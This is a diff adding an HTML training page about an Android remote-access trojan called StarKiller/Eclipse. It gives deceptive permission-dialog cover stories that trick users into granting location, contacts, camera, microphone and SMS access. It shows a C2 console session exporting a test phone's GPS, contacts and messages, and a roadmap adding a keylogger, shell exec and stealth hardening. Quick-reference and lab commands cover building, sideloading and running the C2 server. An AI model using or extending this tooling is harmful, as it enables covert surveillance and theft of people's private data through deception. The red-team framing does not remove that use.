@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 21 — Mobile Security</title>
+<style>
+  :root{--bg:#0c0c0c;--fg:#cccccc;--green:#0f0;--red:#f44;--yellow:#ff0;--cyan:#0ff;--magenta:#f0f;--amber:#ffb000;--prompt:#0f0;}
+  *{box-sizing:border-box;margin:0;padding:0;}
+  body{background:var(--bg);color:var(--fg);font-family:'Segoe UI',Tahoma,sans-serif;font-size:15px;line-height:1.7;padding:20px;}
+  .container{max-width:1000px;margin:0 auto;}
+  .header{text-align:center;margin-bottom:40px;padding-bottom:30px;border-bottom:2px solid #333;}
+  .header h1{color:var(--amber);font-size:32px;text-transform:uppercase;letter-spacing:4px;margin-bottom:10px;}
+  .header .subtitle{color:#666;font-size:16px;}
+  .section{margin-bottom:40px;padding:25px;background:#111;border:1px solid #222;border-radius:8px;}
+  .section-title{color:var(--yellow);font-size:20px;text-transform:uppercase;letter-spacing:2px;margin-bottom:20px;padding-left:15px;border-left:4px solid var(--yellow);}
+  .section-content{color:#bbb;}
+  .section-content p{margin-bottom:15px;}
+  .code-block{background:#0a0a0a;border:1px solid #333;border-radius:6px;padding:15px;margin:15px 0;font-family:'Consolas','Courier New',monospace;font-size:13px;overflow-x:auto;}
+  .code-block .prompt{color:var(--amber);}
+  .code-block .command{color:var(--fg);}
+  .code-block .output{color:#888;margin-top:8px;padding-left:20px;}
+  .code-block .hi{color:var(--cyan);}
+  .code-block .warn{color:#ffb000;}
+  .code-block .ok{color:var(--green);}
+  .code-block .critical{color:var(--red);font-weight:bold;}
+  .note{background:#1a1a1a;border-left:4px solid var(--magenta);padding:15px;margin:20px 0;color:var(--magenta);font-style:italic;}
+  .comparison{display:grid;grid-template-columns:1fr 1fr;gap:20px;margin:15px 0;}
+  .comp-col{background:#0a0a0a;border:1px solid #222;border-radius:4px;padding:15px;}
+  .comp-title{font-size:12px;letter-spacing:2px;text-transform:uppercase;margin-bottom:12px;padding-bottom:8px;border-bottom:1px solid #222;}
+  .comp-title.starkiller{color:var(--cyan);}
+  .comp-title.eclipse{color:var(--amber);}
+  .comp-item{font-size:12px;color:#888;padding:4px 0;border-bottom:1px solid #111;}
+  .widget-container{margin:40px 0;border:2px solid #333;border-radius:8px;overflow:hidden;}
+  .widget-header{background:#1a1a1a;padding:15px;text-align:center;color:var(--amber);font-size:18px;text-transform:uppercase;letter-spacing:2px;border-bottom:1px solid #333;}
+  .widget-iframe{width:100%;height:580px;border:none;background:#000;}
+  .nav{display:flex;justify-content:space-between;margin-top:40px;padding-top:20px;border-top:1px solid #333;}
+  .nav a{color:var(--green);text-decoration:none;padding:10px 20px;border:1px solid var(--green);border-radius:4px;transition:all .3s;}
+  .nav a:hover{background:var(--green);color:#000;}
+  .quick-ref{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-top:20px;}
+  .quick-ref-item{background:#1a1a1a;padding:12px;border-radius:4px;border-left:3px solid var(--amber);}
+  .quick-ref-cmd{color:var(--amber);font-weight:bold;font-family:'Consolas',monospace;font-size:12px;}
+  .quick-ref-desc{color:#888;font-size:12px;margin-top:4px;}
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="header">
+    <h1>Module 21 — Mobile Security</h1>
+    <div class="subtitle">StarKiller and Eclipse: Android RAT from first principles. Permissions, social engineering, C2 over HTTPS. Your phone has no perimeter.</div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Section 1: Android's Attack Surface</div>
+    <div class="section-content">
+      <p>Android runs on 3 billion devices. Most users never check what permissions an app requests. The platform gives you access to GPS, camera, microphone, contacts, SMS, and call logs — with a single dialog they'll tap through.</p>
+      <div class="code-block">
+        <span class="prompt">#</span> <span class="command">What an Android RAT can access (with permissions granted)</span><br>
+        <div class="output">
+          READ_CONTACTS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;→ full contact list<br>
+          ACCESS_FINE_LOCATION&nbsp;&nbsp;&nbsp;→ real-time GPS coordinates<br>
+          CAMERA&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;→ front + rear camera<br>
+          RECORD_AUDIO&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;→ microphone (ambient recording)<br>
+          READ_SMS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;→ all SMS messages<br>
+          READ_CALL_LOG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;→ who they called, when, how long<br>
+          WRITE_EXTERNAL_STORAGE&nbsp;→ read/write all files<br>
+          RECEIVE_BOOT_COMPLETED&nbsp;→ auto-start on reboot<br>
+        </div>
+      </div>
+      <div class="note">Android 6.0+ requires runtime permission dialogs. Before Android 10, you could grant all of these silently via ADB. Post-Android 10, social engineering is the only reliable path for a realistic red team scenario.</div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Section 2: StarKiller vs Eclipse</div>
+    <div class="section-content">
+      <div class="comparison">
+        <div class="comp-col">
+          <div class="comp-title starkiller">STARKILLER — Original</div>
+          <div class="comp-item">ADB pm grant (requires USB/debug mode)</div>
+          <div class="comp-item">All permissions silent — no dialogs</div>
+          <div class="comp-item">Requires: developer options ON</div>
+          <div class="comp-item">Use case: authorized testing, own device</div>
+          <div class="comp-item">C2: web server + REST API</div>
+          <div class="comp-item">Status: Phase 1 COMPLETE</div>
+        </div>
+        <div class="comp-col">
+          <div class="comp-title eclipse">ECLIPSE — Social Engineering Fork</div>
+          <div class="comp-item">In-app Android permission dialogs</div>
+          <div class="comp-item">8-step onboarding wizard with cover stories</div>
+          <div class="comp-item">No ADB, no developer mode required</div>
+          <div class="comp-item">Use case: red team social engineering</div>
+          <div class="comp-item">C2: c2_web.py HTTPS server</div>
+          <div class="comp-item">Status: 11/11 PASS live tested SM-G970U</div>
+        </div>
+      </div>
+      <p>Eclipse is the realistic scenario: user downloads what looks like a utility app, taps through 8 friendly-looking permission dialogs with plausible explanations, and grants full access. Live tested on Samsung Galaxy S10e (SM-G970U) Android 12.</p>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Section 3: The Social Engineering Wizard</div>
+    <div class="section-content">
+      <p>Eclipse's 8-step wizard presents each permission request with a cover story that makes sense to a non-technical user:</p>
+      <div class="code-block">
+        <span class="prompt">#</span> <span class="command">Eclipse onboarding wizard — permission flow</span><br>
+        <div class="output">
+          Step 1: "Location Services" → <span class="warn">ACCESS_FINE_LOCATION</span><br>
+          &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"Enable location for personalised weather updates"<br><br>
+          Step 2: "Contacts Sync"&nbsp;&nbsp;&nbsp;&nbsp;→ <span class="warn">READ_CONTACTS</span><br>
+          &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"Sync your contacts for quick sharing"<br><br>
+          Step 3: "Photo Access"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;→ <span class="warn">CAMERA + WRITE_EXTERNAL_STORAGE</span><br>
+          &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"Let us help you organise your photos"<br><br>
+          Step 4: "Voice Assistant"&nbsp;&nbsp;→ <span class="warn">RECORD_AUDIO</span><br>
+          &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"Say 'Hey App' for hands-free control"<br><br>
+          <span class="hi">... 4 more steps ... all with plausible cover stories</span><br><br>
+          <span class="ok">Result: all permissions granted. No suspicion. Standard app onboarding UX.</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Section 4: C2 Architecture — Eclipse</div>
+    <div class="section-content">
+      <div class="code-block">
+        <span class="prompt">$</span> <span class="command">python c2_web.py --port 8443 --ssl</span><br>
+        <div class="output">
+          <span class="ok">[+] Eclipse C2 listening on 0.0.0.0:8443 (HTTPS)</span><br>
+          <span class="ok">[+] Waiting for implants...</span><br><br>
+          # Phone connects: GET https://c2-server:8443/heartbeat<br>
+          # {device_id, battery, wifi_ssid, location: {lat, lon}}<br><br>
+          <span class="hi">[SESSION] SM-G970U (Samsung Galaxy S10e) — Android 12</span><br>
+          &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Battery: 84%&nbsp;&nbsp;WiFi: RT-AC68U-95B0&nbsp;&nbsp;GPS: -33.8688, 151.2093<br><br>
+          eclipse&gt; <span class="command">location</span><br>
+          <span class="ok">[+] GPS: -33.8688° S, 151.2093° E (Sydney NSW)</span><br>
+          eclipse&gt; <span class="command">contacts dump</span><br>
+          <span class="ok">[+] 247 contacts exported → contacts_SM-G970U.json</span><br>
+          eclipse&gt; <span class="command">sms list</span><br>
+          <span class="ok">[+] 1,842 SMS messages → sms_SM-G970U.json</span>
+        </div>
+      </div>
+      <div class="note">Live tested: 11/11 PASS. All features confirmed working on Samsung SM-G970U (Android 12). Collaboration: asi_dev (IDF, 25yr exp). Roadmap: keylogger, audio recording, shell exec, stealth hardening.</div>
+    </div>
+  </div>
+
+  <div class="widget-container">
+    <div class="widget-header">Eclipse C2 — Android RAT Demo</div>
+    <iframe class="widget-iframe" src="../widgets/eclipse_widget.html" title="Eclipse Android RAT Demo"></iframe>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Quick Reference</div>
+    <div class="section-content">
+      <div class="quick-ref">
+        <div class="quick-ref-item"><div class="quick-ref-cmd">python c2_web.py</div><div class="quick-ref-desc">Start Eclipse C2 server</div></div>
+        <div class="quick-ref-item"><div class="quick-ref-cmd">./build.py --target release</div><div class="quick-ref-desc">Build signed APK</div></div>
+        <div class="quick-ref-item"><div class="quick-ref-cmd">eclipse&gt; location</div><div class="quick-ref-desc">Real-time GPS</div></div>
+        <div class="quick-ref-item"><div class="quick-ref-cmd">eclipse&gt; contacts dump</div><div class="quick-ref-desc">Full contact list</div></div>
+        <div class="quick-ref-item"><div class="quick-ref-cmd">eclipse&gt; sms list</div><div class="quick-ref-desc">All SMS messages</div></div>
+        <div class="quick-ref-item"><div class="quick-ref-cmd">adb install eclipse.apk</div><div class="quick-ref-desc">Sideload for testing</div></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Lab: StarKiller on Your Own Device</div>
+    <div class="section-content">
+      <div class="code-block">
+        # Your own Android device only — explicitly authorised<br><br>
+        1. Enable: Settings → Developer Options → USB Debugging<br>
+        2. Connect device via USB<br>
+        3. adb devices  ← confirm device shows as authorized<br>
+        4. python build.py --target debug<br>
+        5. adb install starkiller-debug.apk<br>
+        6. python c2_web.py  ← start C2 on .92 (LAN accessible)<br>
+        7. Open app on device → complete permission wizard<br>
+        8. C2 console: device session appears<br>
+        9. Test: eclipse&gt; location → confirm GPS returned<br>
+        10. eclipse&gt; contacts dump → see your own contacts exported
+      </div>
+    </div>
+  </div>
+
+  <div class="nav">
+    <a href="MODULE_16_C2.html">← Module 16: C2</a>
+    <a href="../index.html">← Back to Course</a>
+  </div>
+</div>
+</body>
+</html>
